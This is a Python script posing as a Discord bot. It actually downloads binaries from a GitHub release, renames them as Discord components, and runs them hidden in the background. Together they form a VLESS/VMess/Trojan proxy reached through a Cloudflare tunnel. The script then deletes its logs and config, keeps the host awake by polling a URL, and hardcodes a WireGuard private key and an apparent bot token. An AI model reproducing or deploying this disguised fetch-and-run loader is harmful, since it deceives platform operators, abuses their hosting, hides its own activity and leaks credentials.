import os
import re
import shutil
import subprocess
import http.server
import socketserver
import threading
import requests
from flask import Flask
import json
import time
import base64

# Discord bot import
import discord
from discord.ext import commands

# Discord bot setting
intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='!', intents=intents)

app = Flask(__name__)

# Set environment variables
FILE_PATH = os.environ.get('FILE_PATH', './temp')
PROJECT_URL = os.environ.get('URL', '') # 
INTERVAL_SECONDS = int(os.environ.get("TIME", 120))                   # 
BOT_ID = os.environ.get('BOT_ID', '16a68aec-ea98-4361-8137-02866be6fdac')
GUILD_ID = os.environ.get('GUILD_ID', '')                   # 
OWNER_ID = os.environ.get('OWNER_ID', '')                      # 
COMMAND_PREFIX = os.environ.get('COMMAND_PREFIX', 'linux.do')
NAME = os.environ.get('NAME', 'reflex')
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)  # 
VOICE_CHANNEL_PORT = int(os.environ.get('VOICE_CHANNEL_PORT', 8080))       # 
TEXT_CHANNEL_PORT = int(os.environ.get('TEXT_CHANNEL_PORT', 443))           # 

# 
if not os.path.exists(FILE_PATH):
    os.makedirs(FILE_PATH)
    print(f"{FILE_PATH} has been created")
else:
    print(f"{FILE_PATH} already exists")

#
paths_to_delete = ['boot.log', 'list.txt','sub.txt', 'discord_dependencies', 'discord_dashboard', 'discord_botcore', 'tunnel.yml', 'tunnel.json']
for file in paths_to_delete:
    file_path = os.path.join(FILE_PATH, file)
    try:
        os.unlink(file_path)
        print(f"{file_path} has been deleted")
    except Exception as e:
        print(f"Skip Delete {file_path}")

# 
class MyHandler(http.server.SimpleHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Hello, world')
        elif self.path == '/sub':
            try:
                with open(os.path.join(FILE_PATH, 'sub.txt'), 'rb') as file:
                    content = file.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Error reading file')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not found')

httpd = socketserver.TCPServer(('', PORT), MyHandler)
server_thread = threading.Thread(target=httpd.serve_forever)
server_thread.daemon = True
server_thread.start()

# 
def generate_config():
    config ={"log":{"access":"/dev/null","error":"/dev/null","loglevel":"none",},"inbounds":[{"port":VOICE_CHANNEL_PORT ,"protocol":"vless","settings":{"clients":[{"id":BOT_ID ,"flow":"xtls-rprx-vision",},],"decryption":"none","fallbacks":[{"dest":3001 },{"path":"/vless","dest":3002 },{"path":"/vmess","dest":3003 },{"path":"/trojan","dest":3004 },],},"streamSettings":{"network":"tcp",},},{"port":3001 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":BOT_ID },],"decryption":"none"},"streamSettings":{"network":"ws","security":"none"}},{"port":3002 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":BOT_ID ,"level":0 }],"decryption":"none"},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/vless"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3003 ,"listen":"127.0.0.1","protocol":"vmess","settings":{"clients":[{"id":BOT_ID ,"alterId":0 }]},"streamSettings":{"network":"ws","wsSettings":{"path":"/vmess"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3004 ,"listen":"127.0.0.1","protocol":"trojan","settings":{"clients":[{"password":BOT_ID },]},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/trojan"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},],"dns":{"servers":["https+local://8.8.8.8/dns-query"]},"outbounds":[{"protocol":"freedom"},{"tag":"WARP","protocol":"wireguard","settings":{"secretKey":"YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=","address":["172.16.0.2/32","2606:4700:110:8a36:df92:102a:9602:fa18/128"],"peers":[{"publicKey":"bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=","allowedIPs":["0.0.0.0/0","::/0"],"endpoint":"162.159.193.10:2408"}],"reserved":[78 ,135 ,76 ],"mtu":1280 }},],"routing":{"domainStrategy":"AsIs","rules":[{"type":"field","domain":["domain:openai.com","domain:ai.com"],"outboundTag":"WARP"},]}}
    with open(os.path.join(FILE_PATH, 'config.json'), 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)

generate_config()

# e
def get_system_architecture():
    arch = os.uname().machine
    if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
        return 'arm'
    else:
        return 'amd'

# 
def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    with requests.get(file_url, stream=True) as response, open(file_path, 'wb') as file:
        shutil.copyfileobj(response.raw, file)

# 
def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)

    if not files_to_download:
        print("Can't find a file for the current architecture")
        return

    for file_info in files_to_download:
        try:
            download_file(file_info['file_name'], file_info['file_url'])
            print(f"Downloaded {file_info['file_name']} successfully")
        except Exception as e:
            print(f"Download {file_info['file_name']} failed: {e}")

    # 
    files_to_authorize = ['./discord_dependencies', './discord_dashboard', './discord_botcore']
    authorize_files(files_to_authorize)

    # Run x
    command1 = f"nohup {FILE_PATH}/discord_dashboard -c {FILE_PATH}/config.json >/dev/null 2>&1 &"
    try:
        subprocess.run(command1, shell=True, check=True)
        print('discord_dashboard is running')
        subprocess.run('sleep 1', shell=True)  # Wait for 1 second
    except subprocess.CalledProcessError as e:
        print(f'discord_dashboard running error: {e}')

    # 
    if os.path.exists(os.path.join(FILE_PATH, 'discord_botcore')):
	# Get command line arguments for cloud-fared
        args = get_cloud_flare_args()
        # print(args)
        try:
            subprocess.run(f"nohup {FILE_PATH}/discord_botcore {args} >/dev/null 2>&1 &", shell=True, check=True)
            print('discord_botcore is running')
            subprocess.run('sleep 2', shell=True)  # Wait for 2 seconds
        except subprocess.CalledProcessError as e:
            print(f'Error executing command: {e}')

    subprocess.run('sleep 3', shell=True)  # Wait for 3 seconds
	
   
def get_cloud_flare_args():
    
    processed_auth = OWNER_ID
    try:
        auth_data = json.loads(OWNER_ID)
        if 'TunnelSecret' in auth_data and 'AccountTag' in auth_data and 'TunnelID' in auth_data:
            processed_auth = 'TunnelSecret'
    except json.JSONDecodeError:
        pass

    # Determines the condition and generates the corresponding args
    if not processed_auth and not GUILD_ID:
        args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{VOICE_CHANNEL_PORT}'
    elif processed_auth == 'TunnelSecret':
        args = f'tunnel --edge-ip-version auto --config {FILE_PATH}/tunnel.yml run'
    elif processed_auth and GUILD_ID and 120 <= len(processed_auth) <= 250:
        args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {processed_auth}'
    else:
        # Default args for other cases
        args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{VOICE_CHANNEL_PORT}'

    return args

# Return file information based on system architecture
def get_files_for_architecture(architecture):
    if architecture == 'arm':
        return [
            {'file_name': 'discord_dependencies', 'file_url': 'https://github.com/eooce/test/releases/download/ARM/swith'},
            {'file_name': 'discord_dashboard', 'file_url': 'https://github.com/eooce/test/releases/download/ARM/web'},
            {'file_name': 'discord_botcore', 'file_url': 'https://github.com/eooce/test/releases/download/arm64/bot13'},
        ]
    elif architecture == 'amd':
        return [
            {'file_name': 'discord_dependencies', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/npm'},
            {'file_name': 'discord_dashboard', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/web'},
            {'file_name': 'discord_botcore', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/bot13'},
        ]
    return []

#
def authorize_files(file_paths):
    new_permissions = 0o775

    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        try:
            os.chmod(absolute_file_path, new_permissions)
            print(f"Empowerment success for {absolute_file_path}: {oct(new_permissions)}")
        except Exception as e:
            print(f"Empowerment failed for {absolute_file_path}: {e}")


# 
def argo_config():
    if not OWNER_ID or not GUILD_ID:
        print("GUILD_ID or OWNER_ID is empty, use quick Tunnels")
        return

    if 'TunnelSecret' in OWNER_ID:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as file:
            file.write(OWNER_ID)
        tunnel_yaml = f"""
tunnel: {OWNER_ID.split('"')[11]}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {GUILD_ID}
    service: http://localhost:{VOICE_CHANNEL_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
  """
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as file:
            file.write(tunnel_yaml)
    else:
        print("Use token connect to tunnel")

argo_config()

# Get temporary tunnel domain
def extract_domains():
    GUILD_ID = ''

    if OWNER_ID and GUILD_ID:
        GUILD_ID = GUILD_ID
        print('GUILD_ID:', GUILD_ID)
        generate_links(GUILD_ID)
    else:
        try:
            with open(os.path.join(FILE_PATH, 'boot.log'), 'r', encoding='utf-8') as file:
                content = file.read()
                # Use regular expressions to match domain ending in trycloudflare.com
                match = re.search(r'https://([^ ]+\.trycloudflare\.com)', content)
                if match:
                    GUILD_ID = match.group(1)
                    print('ArgoDomain:', GUILD_ID)
                    generate_links(GUILD_ID)
                else:
                    print('ArgoDomain not found, re-running discord_botcore to obtain ArgoDomain')
                    # delete boot.log file
                    os.remove(os.path.join(FILE_PATH, 'boot.log'))
                    # Rerun the bot directly to get the ArgoDomain.
                    args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{VOICE_CHANNEL_PORT}"
                    try:
                        subprocess.run(f"nohup {FILE_PATH}/discord_botcore {args} >/dev/null 2>&1 &", shell=True, check=True)
                        print('discord_botcore is running')
                        time.sleep(3)
                        # Retrieve domain name
                        extract_domains()
                    except subprocess.CalledProcessError as e:
                        print(f"Error executing command: {e}")
        except IndexError as e:
            print(f"IndexError while reading boot.log: {e}")
        except Exception as e:
            print(f"Error reading boot.log: {e}")


#
def generate_links(GUILD_ID):
    meta_info = subprocess.run(['curl', '-s', 'https://speed.cloudflare.com/meta'], capture_output=True, text=True)
    meta_info = meta_info.stdout.split('"')
    ISP = f"{meta_info[25]}-{meta_info[17]}".replace(' ', '_').strip()

    time.sleep(2)
    VMESS = {"v": "2", "ps": f"{NAME}-{ISP}", "add": COMMAND_PREFIX, "port": TEXT_CHANNEL_PORT, "id": BOT_ID, "aid": "0", "scy": "none", "net": "ws", "type": "none", "host": GUILD_ID, "path": "/vmess?ed=2048", "tls": "tls", "sni": GUILD_ID, "alpn": ""}
 
    list_txt = f"""
vless://{BOT_ID}@{COMMAND_PREFIX}:{TEXT_CHANNEL_PORT}?encryption=none&security=tls&sni={GUILD_ID}&type=ws&host={GUILD_ID}&path=%2Fvless?ed=2048#{NAME}-{ISP}
  
vmess://{ base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}

trojan://{BOT_ID}@{COMMAND_PREFIX}:{TEXT_CHANNEL_PORT}?security=tls&sni={GUILD_ID}&type=ws&host={GUILD_ID}&path=%2Ftrojan?ed=2048#{NAME}-{ISP}
    """
    
    with open(os.path.join(FILE_PATH, 'list.txt'), 'w', encoding='utf-8') as list_file:
        list_file.write(list_txt)

    sub_txt = base64.b64encode(list_txt.encode('utf-8')).decode('utf-8')
    with open(os.path.join(FILE_PATH, 'sub.txt'), 'w', encoding='utf-8') as sub_file:
        sub_file.write(sub_txt)
        
    try:
        with open(os.path.join(FILE_PATH, 'sub.txt'), 'rb') as file:
            sub_content = file.read()
        print(f"\n{sub_content.decode('utf-8')}")
    except FileNotFoundError:
        print(f"sub.txt not found")
    
    print(f'{FILE_PATH}/sub.txt saved successfully')
    time.sleep(20)

    # cleanup files
    files_to_delete = ['boot.log', 'list.txt','config.json','tunnel.yml','tunnel.json']
    for file_to_delete in files_to_delete:
        file_path_to_delete = os.path.join(FILE_PATH, file_to_delete)
        try:
            os.remove(file_path_to_delete)
            print(f"{file_path_to_delete} has been deleted")
        except Exception as e:
            print(f"Error deleting {file_path_to_delete}: {e}")

    print('\033c', end='')
    print('App is running')
    print('Thank you for using this script, enjoy!')
         
# 
def start_server():
    download_files_and_run()
    extract_domains()
    
start_server()

# 
has_logged_empty_message = False

def visit_project_page():
    try:
        if not PROJECT_URL or not INTERVAL_SECONDS:
            global has_logged_empty_message
            if not has_logged_empty_message:
                print("URL or TIME variable is empty, Skipping visit web")
                has_logged_empty_message = True
            return

        response = requests.get(PROJECT_URL)
        response.raise_for_status() 

        # print(f"Visiting project page: {PROJECT_URL}")
        print("Page visited successfully")
        print('\033c', end='')
    except requests.exceptions.RequestException as error:
        print(f"Error visiting project page: {error}")

if __name__ == "__main__":
    while True:
        visit_project_page()
        time.sleep(INTERVAL_SECONDS)

# Discord bot order
@bot.command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def sub(ctx):
    try:
        with open(os.path.join(FILE_PATH, 'sub.txt'), 'rb') as file:
            content = file.read()
        await ctx.send(f'```{content.decode("utf-8")}```')
    except FileNotFoundError:
        await ctx.send('Error reading file')

# run Discord bot
bot.run(os.environ.get('MTA2MTg3MzA5ODMyMjM2ODk2OA.GdYN7l.Aq1DfHVQVqTaFuDEBHhW9mMQ3fOV7Se1GGcPUk'))
